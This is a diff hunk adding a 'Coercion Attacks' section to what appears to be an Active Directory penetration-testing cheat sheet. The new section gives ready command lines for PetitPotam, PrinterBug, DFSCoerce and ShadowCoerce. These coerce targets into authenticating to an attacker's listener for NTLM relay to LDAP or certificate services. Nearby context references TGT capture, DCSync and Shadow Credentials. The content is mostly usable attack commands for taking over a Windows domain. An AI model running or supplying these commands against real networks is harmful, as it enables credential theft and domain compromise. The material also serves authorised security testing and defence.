@@ -68,6 +68,24 @@ python3 petitpotam.py <UNCONSTRAINED-HOST> <DC>
 # Captured TGT -> DCSync
 ```
 
+## Coercion Attacks (force a target to authenticate to your listener)
+All feed into NTLM relay (to LDAP for RBCD/Shadow Creds, or to ADCS HTTP
+enrollment for ESC8). Combine with unconstrained delegation above.
+```bash
+# PetitPotam (MS-EFSRPC) — most reliable, works unauthenticated on unpatched
+python3 petitpotam.py <LISTENER> <TARGET>
+python3 petitpotam.py -d <dom> -u <user> -p '<pass>' <LISTENER> <TARGET>
+
+# PrinterBug / SpoolSample (MS-RPRN) — requires Print Spooler running
+python3 printerbug.py '<dom>/<user>:<pass>'@<TARGET> <LISTENER>
+
+# DFSCoerce (MS-DFSNM) — requires DFS role
+python3 dfscoerce.py -d <dom> -u <user> -p '<pass>' <LISTENER> <TARGET>
+
+# ShadowCoerce (MS-FSRVP) — requires File Server VSS Agent
+python3 shadowcoerce.py -d <dom> -u <user> -p '<pass>' <LISTENER> <TARGET>
+```
+
 ## Shadow Credentials (Key Trust)
 **Requires:** WriteProperty on `msDS-KeyCredentialLink` of target.
 Windows Server 2016+ domain functional level.
